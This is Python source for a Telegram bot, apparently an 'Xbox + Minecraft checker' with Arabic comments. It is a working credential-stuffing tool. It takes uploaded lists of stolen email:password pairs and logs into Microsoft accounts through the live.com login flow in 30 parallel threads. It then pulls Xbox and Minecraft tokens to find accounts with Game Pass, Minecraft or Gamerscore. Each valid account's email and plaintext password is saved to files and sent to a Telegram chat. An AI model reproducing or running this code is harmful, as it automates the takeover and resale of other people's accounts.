# -*- coding: utf-8 -*-
"""
XBOX + MINECRAFT TELEGRAM CHECKER BOT - @llljjv
"""

import os
import sys
import time
import requests
import re
import threading
import queue
from urllib.parse import urlparse, parse_qs
import urllib3
from requests.adapters import HTTPAdapter
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

urllib3.disable_warnings()

# =================== الإعدادات العامة ===================
BOT_TOKEN = "ضع_توكن_البوت_هنا"  # ضع توكن بوت التيليجرام الخاص بك هنا
ADMIN_CHAT_ID = "ضع_آيدي_المشرف_هنا"  # آيدي حسابك لكي يرسل لك النتائج

checked = 0
total_combos = 0
hits = 0
bad = 0
twofa = 0
errors = 0
gamepass_count = 0
minecraft_count = 0
gscore_count = 0
start_time = 0
is_running = False

file_lock = threading.Lock()
stats_lock = threading.Lock()
account_counter = 0
account_counter_lock = threading.Lock()

DELAY_BETWEEN_CHECKS = 2
REQUEST_TIMEOUT = 25

def setup_folders():
    if not os.path.exists("XBOX_RESULT"):
        os.makedirs("XBOX_RESULT")
    if not os.path.exists("Hathoun"):
        os.makedirs("Hathoun")

def load_existing_accounts(filename):
    accounts = []
    filepath = os.path.join("XBOX_RESULT", filename)
    if os.path.exists(filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
                raw_accounts = content.split('_________________________________________________________')
                for raw_acc in raw_accounts:
                    if raw_acc.strip():
                        gscore_match = re.search(r'Gamerscore: (\d+)', raw_acc)
                        if gscore_match:
                            gscore = int(gscore_match.group(1))
                            accounts.append({'content': raw_acc.strip(), 'gscore': gscore})
        except Exception as e:
            print(f"Error loading {filename}: {e}")
    return accounts

def remove_duplicates(accounts):
    unique_accounts = {}
    for acc in accounts:
        email_match = re.search(r'Email: (.+?)\n', acc['content'])
        if email_match:
            email = email_match.group(1).strip()
            if email not in unique_accounts:
                unique_accounts[email] = acc
            else:
                if acc['gscore'] > unique_accounts[email]['gscore']:
                    unique_accounts[email] = acc
    return list(unique_accounts.values())

def save_accounts_to_file(accounts, filepath):
    if not accounts:
        return 0
    accounts = remove_duplicates(accounts)
    accounts.sort(key=lambda x: x['gscore'], reverse=True)
    for idx, acc in enumerate(accounts, 1):
        acc['content'] = re.sub(r'Account number: \d+', f'Account number: {idx}', acc['content'])
    with open(filepath, 'w', encoding='utf-8') as f:
        for acc in accounts:
            f.write(acc['content'] + '\n')
    return len(accounts)

def save_hit_immediately(account_type, content, gscore):
    with file_lock:
        if account_type == 'gamepass':
            filename = "XBOX-GamePass.txt"
        elif account_type == 'minecraft':
            filename = "Minecraft-Hits.txt"
        elif account_type == 'gscore':
            filename = "G-Score-Hits.txt"
        else:
            return
        
        filepath = os.path.join("XBOX_RESULT", filename)
        existing = load_existing_accounts(filename)
        new_account = {'content': content, 'gscore': gscore}
        existing.append(new_account)
        save_accounts_to_file(existing, filepath)

# =================== فحص الحسابات ===================
def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'value=\\"([^\\"]+)\\"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).replace('\\/', '/').replace('\\"', '"')
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"'
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).replace('\\/', '/')
    return None

def check_account(combo, bot_app, chat_id):
    global checked, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, account_counter, is_horn_running

    parts = combo.split(':')
    if len(parts) < 2:
        with stats_lock:
            bad += 1
            checked += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)

    session = requests.Session()
    session.verify = False
    session.mount('https://', adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    })

    try:
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT)
        sftag = extract_ppft(resp.text)
        url_post = extract_url_post(resp.text)

        if not sftag or not url_post:
            with stats_lock:
                bad += 1
                checked += 1
            return

        login_data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sftag,
            'type': '11',
            'NewUser': '1',
            'LoginOptions': '3',
        }
        login_req = session.post(url_post, data=login_data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
        
        login_text = login_req.text.lower()
        ms_token = None

        if 'access_token' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
        elif 'access_token' in login_text:
            token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
            if token_match:
                ms_token = token_match.group(1)

        if not ms_token:
            with stats_lock:
                bad += 1
                checked += 1
            return

        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=REQUEST_TIMEOUT)

        if xb_req.status_code != 200:
            with stats_lock:
                bad += 1
                checked += 1
            return

        xb_token = xb_req.json()['Token']
        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

        gamertag, gamerscore, gscore_int = "N/A", "0", 0
        try:
            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=REQUEST_TIMEOUT)
            if xsts_xb_req.status_code == 200:
                xsts_xb_token = xsts_xb_req.json()['Token']
                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=REQUEST_TIMEOUT)
                if prof_req.status_code == 200:
                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s['id'] == 'Gamertag': gamertag = s['value']
                        if s['id'] == 'Gamerscore': 
                            gamerscore = s['value']
                            gscore_int = int(gamerscore) if gamerscore.isdigit() else 0
        except:
            pass

        has_gp, has_mc, gp_type, mc_ent_text = False, False, "", ""
        try:
            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, timeout=REQUEST_TIMEOUT)
            if xsts_mc_req.status_code == 200:
                xsts_mc_token = xsts_mc_req.json()['Token']
                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, timeout=REQUEST_TIMEOUT)
                if mc_auth.status_code == 200:
                    mc_token = mc_auth.json().get('access_token')
                    if mc_token:
                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
                        if ent_req.status_code == 200:
                            mc_ent_text = ent_req.text
        except:
            pass

        if 'product_game_pass_ultimate' in mc_ent_text:
            gp_type, has_gp = "Game Pass Ultimate", True
        elif 'product_game_pass_pc' in mc_ent_text:
            gp_type, has_gp = "PC Game Pass", True

        has_mc = 'product_minecraft' in mc_ent_text

        with account_counter_lock:
            account_counter += 1
            current_num = account_counter

        hit_content = f"""Account number: {current_num}
Email: {email}
Password: {password}
Gamertag: {gamertag}
Gamerscore: {gamerscore}
Minecraft: {'Yes' if has_mc else 'No'}
Game Pass: {gp_type if has_gp else 'No'}
_________________________________________________________"""

        with stats_lock:
            if has_gp:
                gamepass_count += 1
                hits += 1
                save_hit_immediately('gamepass', hit_content, gscore_int)
            elif has_mc:
                minecraft_count += 1
                hits += 1
                save_hit_immediately('minecraft', hit_content, gscore_int)
            elif gscore_int > 0:
                gscore_count += 1
                hits += 1
                save_hit_immediately('gscore', hit_content, gscore_int)
            else:
                bad += 1
            checked += 1

        if has_gp or has_mc or gscore_int > 0:
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                    "chat_id": chat_id,
                    "text": f"🔥 *HIT FOUND!*\n\n{hit_content}",
                    "parse_mode": "Markdown"
                }, timeout=10)
            except:
                pass

    except Exception:
        with stats_lock:
            errors += 1
            checked += 1
    finally:
        session.close()

# =================== أوامر بوت تيليجرام ===================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "🔥 *XBOX + MINECRAFT CHECKER BOT*\n\n"
        "أهلاً بك! استخدم الأمر التالي لبدء الفحص:\n"
        "`/check` (مع إرفاق ملف الـ Combos بصيغة .txt مع الرسالة)"
    )
    await update.message.reply_text(welcome_text, parse_mode="Markdown")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, checked, total_combos, hits, bad, twofa, errors, gamepass_count, minecraft_count, gscore_count, start_time, account_counter
    
    if is_running:
        await update.message.reply_text("⚠️ هناك عملية فحص قيد التشغيل حالياً، انتظر حتى تنتهي.")
        return

    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ يرجى إرسال ملف نصي بصيغة .txt فقط!")
        return

    file = await context.bot.get_file(doc.file_id)
    file_path = "temp_combos.txt"
    await file.download_to_drive(file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if line.strip() and ':' in line]

    if not combos:
        await update.message.reply_text("❌ الملف فارغ أو لا يحتوي على صيغة (User:Pass) صحيحة.")
        return

    setup_folders()
    total_combos = len(combos)
    checked = hits = bad = twofa = errors = gamepass_count = minecraft_count = gscore_count = account_counter = 0
    start_time = time.time()
    is_running = True

    await update.message.reply_text(f"🚀 بدء فحص {total_combos} حساباً بنجاح... سيتم إرسال الـ Hits تباعاً.")

    def run_checking():
        global is_running
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(check_account, combo, context.bot, update.effective_chat.id) for combo in combos]
            concurrent.futures.as_completed(futures)
        is_running = False
        
        # إرسال تقرير الانتهاء
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                "chat_id": update.effective_chat.id,
                "text": f"✅ *انتهت عملية الفحص بنجاح!*\n\n📊 إجمالي الفحص: {checked}\n★ الـ Hits: {hits}\n🎮 Game Pass: {gamepass_count}\n⛏️ Minecraft: {minecraft_count}",
                "parse_mode": "Markdown"
            }, timeout=10)
        except:
            pass

    threading.Thread(target=run_checking, daemon=True).start()

# =================== تشغيل البوت ===================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
